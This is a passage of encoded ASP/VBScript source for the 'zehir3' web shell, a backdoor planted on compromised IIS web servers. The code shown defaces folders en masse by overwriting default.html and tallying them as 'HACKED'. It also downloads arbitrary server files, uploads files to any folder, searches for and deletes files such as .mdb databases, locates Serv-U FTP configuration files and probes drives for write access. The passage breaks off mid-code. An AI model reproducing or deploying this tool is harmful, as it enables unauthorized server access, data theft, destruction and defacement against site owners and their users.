                Set MyFile =3D objFSO.CreateTextFile(hedef_ &amp; sFolder &=
amp;
&quot;default.html&quot;, True)
                MyFile.write byMesaj
            end if

            if err&lt;&gt;0 then
                response.Write folderName_ &amp; &quot; &lt;font
color=3Dred&gt;[FAILED!]&lt;/font&gt;&lt;br&gt;&quot;
                f__ =3D f__ + 1
            else
                response.Write folderName_ &amp; &quot; &lt;font
color=3Dblue&gt;[HACKED]&lt;/font&gt;&lt;br&gt;&quot;
                h__ =3D h__ + 1
            end if
    Next
    ss___ =3D now
    response.Write &quot;&lt;br&gt;&lt;font color=3Dwhite&gt;by zehir!...&l=
t;/font&gt;&lt;br&gt;&lt;b&gt;Keterangan
: &lt;/b&gt; mbuh : &quot;&amp;left(ss__-ss___,5)&amp;&quot;sn. ;)&lt;br&gt=
;&lt;font color=3Dblue&gt;Hacked&lt;/font&gt; =3D
&quot;&amp;h__&amp;&quot;&lt;br&gt;&lt;font color=3Dred&gt;Failed&lt;/font&=
gt; =3D &quot;&amp;f__
    response.End
end if

status =3D Request(&quot;status&quot;)
path   =3D Request(&quot;path&quot;)
dPath  =3D Request(&quot;dPath&quot;)
arama  =3D Request(&quot;txArama&quot;)
dkayit =3D Request(&quot;dkayit&quot;)
table  =3D Request(&quot;table&quot;)
del    =3D Request(&quot;del&quot;)
islem  =3D Request(&quot;islem&quot;)
strSQL =3D Request(&quot;strSQL&quot;)
cf       =3D Request(&quot;cf&quot;)
pathfile =3D request(&quot;pathfile&quot;)
if path=3D&quot;&quot; then path=3Drequest.servervariables(&quot;APPL_PHYSI=
CAL_PATH&quot;)
if status=3D&quot;&quot; then status=3D2
popup =3D true
'////////////////////////////////
Function ReadBinaryFile(FileName)
  Const adTypeBinary =3D 1
  Dim BinaryStream
  Set BinaryStream =3D CreateObject(&quot;ADODB.Stream&quot;)
  BinaryStream.Type =3D adTypeBinary
  BinaryStream.Open
  BinaryStream.LoadFromFile FileName
  ReadBinaryFile =3D BinaryStream.Read
End Function
if status=3D&quot;-3&quot; then
    Response.Buffer=3DTrue
    Set Fil =3D objFSO.GetFile(pathfile)

    Response.contenttype=3D&quot;application/force-download&quot;
    Response.AddHeader &quot;Cache-control&quot;,&quot;private&quot;
    Response.AddHeader &quot;Content-Length&quot;, Fil.Size
    Response.AddHeader &quot;Content-Disposition&quot;, &quot;attachment; f=
ilename=3D&quot; &amp;
Fil.name

    Response.BinaryWrite readBinaryFile(Fil.path)
    Set f =3D Nothing: Set Fil =3D Nothing
    response.End()
end if
'//////////////////////////////////
if status=3D&quot;-4&quot; then popup=3Dfalse
if status=3D&quot;13&quot; then popup=3Dfalse
if status=3D&quot;14&quot; then popup=3Dfalse
if status=3D&quot;15&quot; then popup=3Dfalse
if status=3D&quot;16&quot; then popup=3Dfalse
if status=3D&quot;17&quot; then popup=3Dfalse
if status=3D&quot;18&quot; then popup=3Dfalse
if status=3D&quot;19&quot; then popup=3Dfalse
if status=3D&quot;33&quot; then popup=3Dfalse
if status=3D&quot;40&quot; then popup=3Dfalse
if status=3D&quot;50&quot; then popup=3Dfalse
byMsg =3D request.QueryString(&quot;byMsg&quot;)
if byMsg&lt;&gt;&quot;&quot; then response.Write byMsg
response.Write &quot;&lt;title&gt;zehir3 --&gt; powered by zehir&lt;/title&=
gt;&quot;
if popup then
%&gt;
&lt;center&gt;
&lt;a href=3D&quot;&lt;%=3DdosyaPath%&gt;?mevla=3D1&amp;status=3D13&quot;
onclick=3D&quot;sistemBilgisi(this.href);return false;&quot;&gt;System Info=
&lt;/a&gt;
&lt;font color=3Dyellow&gt; | &lt;/font&gt;
&lt;a href=3D&quot;&lt;%=3DdosyaPath%&gt;?mevla=3D1&amp;status=3D40&quot;
onclick=3D&quot;sistemTest(this.href);return false;&quot;&gt;System Test&lt=
;/a&gt;
&lt;font color=3Dyellow&gt; | &lt;/font&gt;
&lt;a href=3D&quot;&lt;%=3DdosyaPath%&gt;?mevla=3D1&amp;status=3D50&amp;pat=
h=3D&lt;%=3Dpath%&gt;&quot;
onclick=3D&quot;SitelerTestte(this.href);return false;&quot;&gt;Sites Test&=
lt;/a&gt;
&lt;font color=3Dyellow&gt; | &lt;/font&gt;
&lt;a href=3D&quot;&lt;%=3DdosyaPath%&gt;?mevla=3D1&amp;status=3D14&amp;pat=
h=3D&lt;%=3Dpath%&gt;&quot;
onclick=3D&quot;klasorIslemleri(this.href);return false;&quot;&gt;Folder Ac=
tion&lt;/a&gt;
&lt;font color=3Dyellow&gt; | &lt;/font&gt;
&lt;a href=3D&quot;&lt;%=3DdosyaPath%&gt;?mevla=3D1&amp;status=3D15&quot; o=
nclick=3D&quot;sqlServer(this.href);return
false;&quot;&gt;SQL Server&lt;/a&gt;
&lt;font color=3Dyellow&gt; | &lt;/font&gt;
&lt;a href=3D&quot;&lt;%=3DdosyaPath%&gt;?mevla=3D1&amp;status=3D33&quot; o=
nclick=3D&quot;poweredby(this.href);return
false;&quot;&gt;POWERED BY&lt;/a&gt;
&lt;script language=3Djavascript&gt;
    function sistemBilgisi(yol){
        NewWindow(yol,&quot;&quot;,600,240,&quot;no&quot;);
    }
    function SitelerTestte(yol){
        NewWindow(yol,&quot;&quot;,530,420,&quot;no&quot;);
    }
    function klasorIslemleri(yol){
        NewWindow(yol,&quot;&quot;,400,280,&quot;no&quot;);
    }
    function sqlServer(yol){
        NewWindow(yol,&quot;&quot;,300,50,&quot;no&quot;);
    }
    function poweredby(yol){
        NewWindow(yol,&quot;&quot;,300,50,&quot;no&quot;);
    }
    function sistemTest(yol){
        NewWindow(yol,&quot;&quot;,400,300,&quot;no&quot;);
    }
&lt;/script&gt;
&lt;%
end if
'####################################
Class clsUpload
    Private mbinData
    Private mlngChunkIndex
    Private mlngBytesReceived
    Private mstrDelimiter
    Private CR
    Private LF
    Private CRLF
    Private mobjFieldAry()
    Private mlngCount

    Private Sub RequestData
        Dim llngLength
        mlngBytesReceived =3D Request.TotalBytes
        mbinData =3D Request.BinaryRead(mlngBytesReceived)
    End Sub

    Private Sub ParseDelimiter()
        mstrDelimiter =3D MidB(mbinData, 1, InStrB(1, mbinData, CRLF) - 1)
    End Sub

    Private Sub ParseData()
        Dim llngStart
        Dim llngLength
        Dim llngEnd
        Dim lbinChunk
        llngStart =3D 1
        llngStart =3D InStrB(llngStart, mbinData, mstrDelimiter &amp; CRLF)
        While Not llngStart =3D 0
            llngEnd =3D InStrB(llngStart + 1, mbinData, mstrDelimiter) - 2
            llngLength =3D llngEnd - llngStart
            lbinChunk =3D MidB(mbinData, llngStart, llngLength)
            Call ParseChunk(lbinChunk)
            llngStart =3D InStrB(llngStart + 1, mbinData, mstrDelimiter &am=
p; CRLF)
        Wend
    End Sub

    Private Sub ParseChunk(ByRef pbinChunk)
        Dim lstrName
        Dim lstrFileName
        Dim lstrContentType
        Dim lbinData
        Dim lstrDisposition
        Dim lstrValue
        lstrDisposition =3D ParseDisposition(pbinChunk)
        lstrName =3D ParseName(lstrDisposition)
        lstrFileName =3D ParseFileName(lstrDisposition)
        lstrContentType =3D ParseContentType(pbinChunk)
        If lstrContentType =3D &quot;&quot; Then
            lstrValue =3D CStrU(ParseBinaryData(pbinChunk))
        Else
            lbinData =3D ParseBinaryData(pbinChunk)
        End If
        Call AddField(lstrName, lstrFileName, lstrContentType, lstrValue,
lbinData)
    End Sub

    Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef
pstrContentType, ByRef pstrValue, ByRef pbinData)
        Dim lobjField
        ReDim Preserve mobjFieldAry(mlngCount)
        Set lobjField =3D New clsField
        lobjField.Name =3D pstrName
        lobjField.FilePath =3D pstrFileName
        lobjField.ContentType =3D pstrContentType
        If LenB(pbinData) =3D 0 Then
            lobjField.BinaryData =3D ChrB(0)
            lobjField.Value =3D pstrValue
            lobjField.Length =3D Len(pstrValue)
        Else
            lobjField.BinaryData =3D pbinData
            lobjField.Length =3D LenB(pbinData)
            lobjField.Value =3D &quot;&quot;
        End If
        Set mobjFieldAry(mlngCount) =3D lobjField
        mlngCount =3D mlngCount + 1
    End Sub

    Private Function ParseBinaryData(ByRef pbinChunk)
        Dim llngStart
        llngStart =3D InStrB(1, pbinChunk, CRLF &amp; CRLF)
        If llngStart =3D 0 Then Exit Function
        llngStart =3D llngStart + 4
        ParseBinaryData =3D MidB(pbinChunk, llngStart)
    End Function

    Private Function ParseContentType(ByRef pbinChunk)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart =3D InStrB(1, pbinChunk, CRLF &amp; CStrB(&quot;Content-T=
ype:&quot;),
vbTextCompare)
        If llngStart =3D 0 Then Exit Function
        llngEnd =3D InStrB(llngStart + 15, pbinChunk, CR)
        If llngEnd =3D 0 Then Exit Function
        llngStart =3D llngStart + 15
        If llngStart &gt;=3D llngEnd Then Exit Function
        llngLength =3D llngEnd - llngStart
        ParseContentType =3D Trim(CStrU(MidB(pbinChunk, llngStart, llngLeng=
th)))
    End Function

    Private Function ParseDisposition(ByRef pbinChunk)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart =3D InStrB(1, pbinChunk, CRLF &amp; CStrB(&quot;Content-D=
isposition:&quot;),
vbTextCompare)
        If llngStart =3D 0 Then Exit Function
        llngEnd =3D InStrB(llngStart + 22, pbinChunk, CRLF)
        If llngEnd =3D 0 Then Exit Function
        llngStart =3D llngStart + 22
        If llngStart &gt;=3D llngEnd Then Exit Function
        llngLength =3D llngEnd - llngStart
        ParseDisposition =3D CStrU(MidB(pbinChunk, llngStart, llngLength))
    End Function

    Private Function ParseName(ByRef pstrDisposition)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart =3D InStr(1, pstrDisposition, &quot;name=3D&quot;&quot;&q=
uot;, vbTextCompare)
        If llngStart =3D 0 Then Exit Function
        llngEnd =3D InStr(llngStart + 6, pstrDisposition, &quot;&quot;&quot=
;&quot;)
        If llngEnd =3D 0 Then Exit Function
        llngStart =3D llngStart + 6
        If llngStart &gt;=3D llngEnd Then Exit Function
        llngLength =3D llngEnd - llngStart
        ParseName =3D Mid(pstrDisposition, llngStart, llngLength)
    End Function
'
---------------------------------------------------------------------------=
---
    Private Function ParseFileName(ByRef pstrDisposition)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart =3D InStr(1, pstrDisposition, &quot;filename=3D&quot;&quo=
t;&quot;, vbTextCompare)
        If llngStart =3D 0 Then Exit Function
        llngEnd =3D InStr(llngStart + 10, pstrDisposition, &quot;&quot;&quo=
t;&quot;)
        If llngEnd =3D 0 Then Exit Function
        llngStart =3D llngStart + 10
        If llngStart &gt;=3D llngEnd Then Exit Function
        llngLength =3D llngEnd - llngStart
        ParseFileName =3D Mid(pstrDisposition, llngStart, llngLength)
    End Function

    Public Property Get Count()
        Count =3D mlngCount
    End Property

    Public Default Property Get Fields(ByVal pstrName)
        Dim llngIndex
        If IsNumeric(pstrName) Then
            llngIndex =3D CLng(pstrName)
            If llngIndex &gt; mlngCount - 1 Or llngIndex &lt; 0 Then
                Call Err.Raise(vbObjectError + 1, &quot;clsUpload.asp&quot;=
, &quot;Object does
not exist within the ordinal reference.&quot;)
                Exit Property
            End If
            Set Fields =3D mobjFieldAry(pstrName)
        Else
            pstrName =3D LCase(pstrname)
            For llngIndex =3D 0 To mlngCount - 1
                If LCase(mobjFieldAry(llngIndex).Name) =3D pstrName Then
                    Set Fields =3D mobjFieldAry(llngIndex)
                    Exit Property
                End If
            Next
        End If
        Set Fields =3D New clsField
    End Property

    Private Sub Class_Terminate()
        Dim llngIndex
        For llngIndex =3D 0 To mlngCount - 1
            Set mobjFieldAry(llngIndex) =3D Nothing

        Next
        ReDim mobjFieldAry(-1)
    End Sub

    Private Sub Class_Initialize()
        ReDim mobjFieldAry(-1)
        CR =3D ChrB(Asc(vbCr))
        LF =3D ChrB(Asc(vbLf))
        CRLF =3D CR &amp; LF
        mlngCount =3D 0
        Call RequestData
        Call ParseDelimiter()
        Call ParseData
    End Sub

    Private Function CStrU(ByRef pstrANSI)
        Dim llngLength
        Dim llngIndex
        llngLength =3D LenB(pstrANSI)
        For llngIndex =3D 1 To llngLength
            CStrU =3D CStrU &amp; Chr(AscB(MidB(pstrANSI, llngIndex, 1)))
        Next
    End Function

    Private Function CStrB(ByRef pstrUnicode)
        Dim llngLength
        Dim llngIndex
        llngLength =3D Len(pstrUnicode)
        For llngIndex =3D 1 To llngLength
            CStrB =3D CStrB &amp; ChrB(Asc(Mid(pstrUnicode, llngIndex, 1)))
        Next
    End Function
End Class
'####################################
Session(&quot;n1&quot;) =3D &quot;&quot; '&quot;by Ejder&quot;
Class clsField
    Public Name
    Private mstrPath
    Public FileDir
    Public FileExt
    Public FileName
    Public ContentType
    Public Value
    Public BinaryData
    Public Length
    Private mstrText

    Public Property Get BLOB()
        BLOB =3D BinaryData
    End Property

    Public Function BinaryAsText()
        Dim lbinBytes
        Dim lobjRs
        If Length =3D 0 Then Exit Function
        If LenB(BinaryData) =3D 0 Then Exit Function

        If Not Len(mstrText) =3D 0 Then
            BinaryAsText =3D mstrText
            Exit Function
        End If
        lbinBytes =3D ASCII2Bytes(BinaryData)
           mstrText =3D Bytes2Unicode(lbinBytes)
        BinaryAsText =3D mstrText
    End Function

    Public Sub SaveAs(ByRef pstrFileName)
        Const adTypeBinary=3D1
        Const adSaveCreateOverWrite=3D2
        Dim lobjStream
        Dim lobjRs
        Dim lbinBytes
        If Length =3D 0 Then Exit Sub
        If LenB(BinaryData) =3D 0 Then Exit Sub
        Set lobjStream =3D Server.CreateObject(&quot;ADODB.Stream&quot;)
        lobjStream.Type =3D adTypeBinary
        Call lobjStream.Open()
        lbinBytes =3D ASCII2Bytes(BinaryData)
        Call lobjStream.Write(lbinBytes)

        On Error Resume Next

        Call lobjStream.SaveToFile(pstrFileName, adSaveCreateOverWrite)

        'if err&lt;&gt;0 then response.Write &quot;&lt;br&gt;&quot;&amp;err=
.Description

        Call lobjStream.Close()
        Set lobjStream =3D Nothing
    End Sub

    Public Property Let FilePath(ByRef pstrPath)
        mstrPath =3D pstrPath
        If Not InStrRev(pstrPath, &quot;.&quot;) =3D 0 Then
            FileExt =3D Mid(pstrPath, InStrRev(pstrPath, &quot;.&quot;) + 1)
            FileExt =3D UCase(FileExt)
        End If
        If Not InStrRev(pstrPath, &quot;\&quot;) =3D 0 Then
            FileName =3D Mid(pstrPath, InStrRev(pstrPath, &quot;\&quot;) + =
1)
        End If
        If Not InStrRev(pstrPath, &quot;\&quot;) =3D 0 Then
            FileDir =3D Mid(pstrPath, 1, InStrRev(pstrPath, &quot;\&quot;) =
- 1)
        End If
    End Property

    Public Property Get FilePath()
        FilePath =3D mstrPath
    End Property

    private Function ASCII2Bytes(ByRef pbinBinaryData)
        Const adLongVarBinary=3D205
        Dim lobjRs
        Dim llngLength
        Dim lbinBuffer
        llngLength =3D LenB(pbinBinaryData)
        Set lobjRs =3D Server.CreateObject(&quot;ADODB.Recordset&quot;)
        Call lobjRs.Fields.Append(&quot;BinaryData&quot;, adLongVarBinary, =
llngLength)
        Call lobjRs.Open()
        Call lobjRs.AddNew()
        Call lobjRs.Fields(&quot;BinaryData&quot;).AppendChunk(pbinBinaryDa=
ta &amp; ChrB(0))
        Call lobjRs.Update()
        lbinBuffer =3D lobjRs.Fields(&quot;BinaryData&quot;).GetChunk(llngL=
ength)
        Call lobjRs.Close()
        Set lobjRs =3D Nothing
        ASCII2Bytes =3D lbinBuffer
    End Function

    Private Function Bytes2Unicode(ByRef pbinBytes)
        Dim lobjRs
        Dim llngLength
        Dim lstrBuffer
        llngLength =3D LenB(pbinBytes)
        Set lobjRs =3D Server.CreateObject(&quot;ADODB.Recordset&quot;)
        Call lobjRs.Fields.Append(&quot;BinaryData&quot;, adLongVarChar, ll=
ngLength)
        Call lobjRs.Open()
        Call lobjRs.AddNew()
        Call lobjRs.Fields(&quot;BinaryData&quot;).AppendChunk(pbinBytes)
        Call lobjRs.Update()
        lstrBuffer =3D lobjRs.Fields(&quot;BinaryData&quot;).Value
        Call lobjRs.Close()
        Set lobjRs =3D Nothing
        Bytes2Unicode =3D lstrBuffer
    End Function
End Class
Session(&quot;n2&quot;) =3D &quot;&quot; '&quot;Ejder&quot;
'####################################
function addslash(path)
    if right(path,1)=3D&quot;\&quot; then addslash=3Dpath else addslash=3Dp=
ath &amp; &quot;\&quot;
end function

sub Upload()
    dim objUpload,f,max,i,name,path,size,success

    set objUpload=3DNew clsUpload

    targetPath=3DobjUpload.Fields(&quot;folder&quot;).Value
    max=3DobjUpload.Fields(&quot;max&quot;).Value

    for i=3D1 to max
        name=3DobjUpload.Fields(&quot;file&quot; &amp; i).FileName
        size=3DobjUpload.Fields(&quot;file&quot; &amp; i).Length
        if (name&lt;&gt;&quot;&quot;) and (size&gt;0) then
            gMsg=3DgMsg &amp; &quot;&lt;br&gt;&quot; &amp; vbNewLine &amp; =
&quot;- &quot; &amp; name &amp; &quot; (&quot; &amp;
FormatNumber(size,0) &amp; &quot; bytes): &quot;
            path=3Daddslash(targetPath) &amp; name
            objUpload.Fields(&quot;file&quot; &amp; i).SaveAs path

            if objFSO.FileExists(path) then
                on error resume next
                set f=3DobjFSO.GetFile(path)
                if IsObject(f) then
                    if f.Size=3Dsize then success=3Dtrue else success=3Dfal=
se
                end if
                set f=3Dnothing
            end if
            if success then  gMsg=3DgMsg &amp; &quot;&lt;font color=3Dblue&=
gt;uploaded&lt;/font&gt;&quot;
else gMsg =3D gMsg &amp; &quot;&lt;font color=3Dred&gt;failed!&lt;/font&gt;=
&quot;
        end if
    next
    response.Write gMsg
    set objUpload=3Dnothing

end sub

if status=3D&quot;-4&quot; then
    Upload()
'    hataKontrol
    popup=3Dfalse
end if
'////////////////////////////////
sub hataKontrol
    if err&lt;&gt;0 then
        Response.Write &quot;&lt;font color=3Dred size=3D2&gt;Hata :
&quot;&amp;err.Description&amp;&quot;&lt;/font&gt;&quot;
    end if
end sub

sub araBul(path_,ara_)
    on error resume next
    If Len(path_) &gt; 0 Then
        cur =3D path_&amp;&quot;\&quot;
        If cur =3D &quot;\\&quot; Then cur =3D &quot;&quot;
            parent =3D &quot;&quot;
            If InStrRev(cur,&quot;\&quot;) &gt; 0 Then
            parent =3D Left(cur, InStrRev(cur, &quot;\&quot;, Len(cur)-1))
        End If
    Else
        cur =3D &quot;&quot;
    End If

    Set f =3D objFSO.GetFolder(cur)

    Set fc =3D f.Files
    For Each f1 In fc
        if lcase(InStr(1,f1.name,lcase(ara_)))&gt;0 then
            downStr =3D &quot;&lt;font face=3Dwebdings size=3D5&gt;&lt;a
href=3D'&quot;&amp;dosyapath&amp;&quot;?status=3D-3&amp;pathFile=3D&quot;&a=
mp;f1.path&amp;&quot;&amp;Time=3D&quot;&amp;time&amp;&quot;'&gt;=C3=8D&lt;/=
a&gt;&lt;/font&gt;&quot;
            if lcase(ara_)=3D&quot;mdb&quot; then
                Response.Write downStr&amp;&quot;&lt;font face=3Dwingdings =
size=3D5&gt;&lt;a
href=3D'&quot;&amp;dosyapath&amp;&quot;?status=3D3&amp;path=3D&quot;&amp;pa=
th_&amp;&quot;&amp;Del=3D&quot;&amp;f1.path&amp;&quot;&amp;Time=3D&quot;&am=
p;time&amp;&quot;'&gt;=C3=BB&lt;/a&gt;&lt;/font&gt;
* &lt;a href=3D'&quot;&amp;dosyapath&amp;&quot;?status=3D7&amp;path=3D&quot=
;&amp;f1.path&amp;&quot;&amp;Time=3D&quot;&amp;time&amp;&quot;'&gt;&quot;&a=
mp;f1.path&amp;&quot;
[&quot;&amp;f1.size&amp;&quot;]&quot;&amp;&quot;&lt;/a&gt;&lt;/b&gt;&lt;br&=
gt;&quot;
            else
                Response.Write downStr&amp;&quot;&lt;font face=3Dwingdings =
size=3D5&gt;&lt;a
href=3D'&quot;&amp;dosyapath&amp;&quot;?status=3D3&amp;path=3D&quot;&amp;pa=
th_&amp;&quot;&amp;Del=3D&quot;&amp;f1.path&amp;&quot;&amp;Time=3D&quot;&am=
p;time&amp;&quot;'&gt;=C3=BB&lt;/a&gt;&lt;a
href=3D'&quot;&amp;dosyapath&amp;&quot;?status=3D10&amp;dPath=3D&quot;&amp;=
f1.path&amp;&quot;&amp;path=3D&quot;&amp;path&amp;&quot;&amp;Time=3D&quot;&=
amp;time&amp;&quot;'&gt;!&lt;/a&gt;&lt;/font&gt;
- &lt;a href=3D'&quot;&amp;dosyapath&amp;&quot;?status=3D5&amp;path=3D&quot=
;&amp;f1.path&amp;&quot;&amp;Time=3D&quot;&amp;time&amp;&quot;'&gt;&quot;&a=
mp;f1.path&amp;&quot;
[&quot;&amp;f1.size&amp;&quot;]&quot;&amp;&quot;&lt;/a&gt;&lt;/b&gt;&lt;br&=
gt;&quot;
            end if
        end if
    Next

    Set fs =3D f.SubFolders
    For Each f1 In fs
        araBul f1.path,ara_
    Next
    Set    f        =3D Nothing
    Set fc        =3D Nothing
    Set fs        =3D Nothing
end sub

sub sistemTest
    response.Write &quot;&lt;table width=3D'100%' align=3Dcenter cellpaddin=
g=3D0
cellspacing=3D0 border=3D1&gt;&quot;
    response.Write &quot;&lt;tr bgcolor=3D#ffffc0&gt;&lt;td width=3D'30%' a=
lign=3Dcenter&gt;&lt;font
color=3Dnavy&gt;&lt;b&gt;Lokasi&lt;/td&gt;&lt;td width=3D'70%' align=3Dcent=
er&gt;&lt;font
color=3Dnavy&gt;&lt;b&gt;Keterangan&lt;/td&gt;&lt;/tr&gt;&quot;

    servu_Test
    WriteTestOnDriver
    WriteTestOnLocalPath
    LocalPathParentFolder
    LocalPathPParentFolder

    response.Write &quot;&lt;/table&gt;&quot;
end sub

sub servu_Test
    dosya_ =3D Array(&quot;Program Files\Serv-u\Serv-u.ini&quot;, &quot;Pro=
gram
Files\Serv-u\Serv-u daemon.ini&quot;, &quot;Serv-u\Serv-u.ini&quot;, &quot;=
Serv-u\Serv-u
daemon.ini&quot;)
    for each drive_ in objFSO.Drives
        if drive_.Drivetype=3D2 or drive_.Drivetype=3D3 then
            for each d_ in dosya_
                d_ =3D drive_.DriveLetter&amp;&quot;:\&quot;&amp;d_
                if objFSO.FileExists(d_) then
                    response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Serv-=
U ini file : &lt;/td&gt;&lt;td&gt;&lt;font
color=3Dyellow&gt;&quot;&amp;d_&amp;&quot;&lt;/td&gt;&lt;/tr&gt;&quot;
                end if
            next
        end if
    next
end sub

function yaziyomu(yol)
    on error goto 0:on error resume next
    dim sonuc__
    Set MyFile =3D objFSO.CreateTextFile(yol &amp; &quot;\test.zehir&quot;,=
 True)
    MyFile.write &quot;byzehir&quot;
    set MyFile =3D Nothing
    if err&lt;&gt;0 then
        sonuc__=3D&quot;&lt;font color=3Dred&gt;This file is very dangerous=
 !!, delete me
plz&lt;/font&gt;&quot;
    else
        sonuc__=3D&quot;&lt;font color=3Dyellow&gt;Yazma Hakk=C3=BD Var! (b=
ahasane aneh) &lt;/font&gt;&quot;
        on error goto 0: on error resume next
        objFSO.DeleteFile yol &amp; &quot;\test.zehir&quot;,true
        if err&lt;&gt;0 then
            sonuc__=3Dsonuc__&amp;&quot;&lt;br&gt;&lt;font color=3Dred&gt;S=
ilme Hakk=C3=BD Yok!&lt;/font&gt;&quot;
        else
            sonuc__=3Dsonuc__&amp;&quot;&lt;br&gt;&lt;font color=3Dyellow&g=
t;Silme Hakk=C3=BD Var!&lt;/font&gt;&quot;
        end if
    end if
    yaziyomu =3D sonuc__
end function

function yaziyomu2(yol)
    on error goto 0:on error resume next
    Set MyFile =3D objFSO.CreateTextFile(yol &amp; &quot;\test.zehir&quot;,=
 True)
    MyFile.write &quot;byzehir&quot;
    set MyFile =3D Nothing
    if err&lt;&gt;0 then
        yaziyomu2 =3D false
    else
        objFSO.DeleteFile yol &amp; &quot;\test.zehir&quot;
        yaziyomu2 =3D true
    end if
end function

sub WriteTestOnDriver
    for each drive_ in objFSO.Drives
        if drive_.Drivetype=3D2 or drive_.Drivetype=3D3 then
            if not yaziyomu2(drive_.DriveLetter&amp;&quot;:\&quot;) then
                Response.Write
&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&quot;&amp;drive_.DriveLetter&amp;&quot;=
:\&lt;/td&gt;&lt;td&gt;&lt;font color=3Dred&gt;tidak bisa
diciptakan file, tapi mungkin folder didalamnya bisa :
[&quot;&amp;err.Description&amp;&quot;]&lt;/td&gt;&lt;/tr&gt;&quot;
            else
                Response.Write
&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&quot;&amp;drive_.DriveLetter&amp;&quot;=
:\&lt;/td&gt;&lt;td&gt;&lt;font color=3Dyellow&gt;Folder ini
dapat diciptakan file&lt;/td&gt;&lt;/tr&gt;&quot;
            end if
        end if
    next
end sub

sub WriteTestOnLocalPath
    on error goto 0
    on error resume next
    if not yaziyomu2(request.servervariables(&quot;APPL_PHYSICAL_PATH&quot;=
)) then
        Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Local Path &lt;/t=
d&gt;&lt;td&gt;&lt;font color=3Dred&gt;tidak
bisa diciptakan file, tapi mungkin folder didalamnya bisa :
[&quot;&amp;err.Description&amp;&quot;]&lt;/td&gt;&lt;/tr&gt;&quot;
    else
        Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Local Path &lt;/t=
d&gt;&lt;td&gt;&lt;font
color=3Dyellow&gt;Folder ini dapat diciptakan file&lt;/td&gt;&lt;/tr&gt;&qu=
ot;
    end if
end sub

sub LocalPathParentFolder
    on error goto 0
    on error resume next
    hed_ =3D request.servervariables(&quot;APPL_PHYSICAL_PATH&quot;)
    if Right(hed_,1)=3D&quot;\&quot; then hed_ =3D left(hed_,len(hed_)-1)
    parhed_ =3D left(hed_,InStrRev(hed_,&quot;\&quot;))

    Set f =3D objFSO.GetFolder(parhed_)
    Set fc =3D f.SubFolders

    int_fol=3D0
    int_fil=3D0
    For Each f1 In fc
        int_fol=3Dint_fol+1
    Next

    Set fc =3D f.files
    For Each f1 In fc
        int_fil=3Dint_fil+1
    Next

    if err&lt;&gt;0 then
        Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Local Path &lt;br=
&gt;Parent Folder&lt;/td&gt;&lt;td&gt;&lt;font
color=3Dred&gt;Hata Olu=C3=BEtu : [&quot;&amp;err.Description&amp;&quot;]&l=
t;/td&gt;&lt;/tr&gt;&quot;
    else
        Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Local Path &lt;br=
&gt;Parent Folder&lt;/td&gt;&lt;td&gt;&lt;font
color=3Dyellow&gt;Folder : &quot;&amp;FormatNumber(int_fol,0)&amp;&quot;&lt=
;br&gt;File :
&quot;&amp;FormatNumber(int_fil,0)&amp;&quot;&lt;/td&gt;&lt;/tr&gt;&quot;
    end if
end sub

sub LocalPathPParentFolder
    on error goto 0
    on error resume next
    hed_ =3D request.servervariables(&quot;APPL_PHYSICAL_PATH&quot;)
    if Right(hed_,1)=3D&quot;\&quot; then hed_ =3D left(hed_,len(hed_)-1)
    hed_ =3D left(hed_,InStrRev(hed_,&quot;\&quot;))
    if Right(hed_,1)=3D&quot;\&quot; then hed_ =3D left(hed_,len(hed_)-1)
    parhed_ =3D left(hed_,InStrRev(hed_,&quot;\&quot;))

    Set f =3D objFSO.GetFolder(parhed_)
    Set fc =3D f.SubFolders
    int_fol=3D0
    int_fil=3D0
    For Each f1 In fc
        int_fol=3Dint_fol+1
    Next

    Set fc =3D f.files
    For Each f1 In fc
        int_fil=3Dint_fil+1
    Next

    if err&lt;&gt;0 then
        if err=3D451 then
            Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Local Path &l=
t;br&gt;P.Parent
Folder&lt;/td&gt;&lt;td&gt;&lt;font color=3Dred&gt;Data =C3=9Cst Klasor Yok=
 :)&lt;/td&gt;&lt;/tr&gt;&quot;
        else
            Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Local Path &l=
t;br&gt;P.Parent
Folder&lt;/td&gt;&lt;td&gt;&lt;font color=3Dred&gt;Hata Olu=C3=BEtu : [&quo=
t;&amp;err.Description&amp;&quot;]&lt;/td&gt;&lt;/tr&gt;&quot;
        end if
    else
        Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Local Path &lt;br=
&gt;P.Parent Folder&lt;/td&gt;&lt;td&gt;&lt;font
color=3Dyellow&gt;Folder : &quot;&amp;FormatNumber(int_fol,0)&amp;&quot;&lt=
;br&gt;File :
&quot;&amp;FormatNumber(int_fil,0)&amp;&quot;&lt;/td&gt;&lt;/tr&gt;&quot;
    end if
end sub

SELECT CASE status
CASE 13 'Sistem Bilgisi
    Response.Write &quot;&lt;table width=3D100% cellpadding=3D0 cellspacing=
=3D0&gt;&lt;tr&gt;&lt;td
colspan=3D2 align=3Dcenter&gt;&lt;font color=3Dyellow face=3D'courier new'&=
gt;&lt;b&gt;&lt;font
style=3D'FONT-WEIGHT:normal' color=3Dred face=3Dwingdings&gt;:&lt;/font&gt;=
 Informasi
target&lt;font color=3Dred face=3Dwingdings
style=3D'FONT-WEIGHT:normal'&gt;:&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&quot;
    Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;font color=3Dred&=
gt;Local Adres&lt;/td&gt;&lt;td&gt; &quot; &amp;
request.servervariables(&quot;REMOTE_ADDR&quot;) &amp; &quot;&lt;/td&gt;&lt=
;/tr&gt;&quot;
    Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;font color=3Dred&=
gt;User Agent&lt;/td&gt;&lt;td&gt; &quot; &amp;
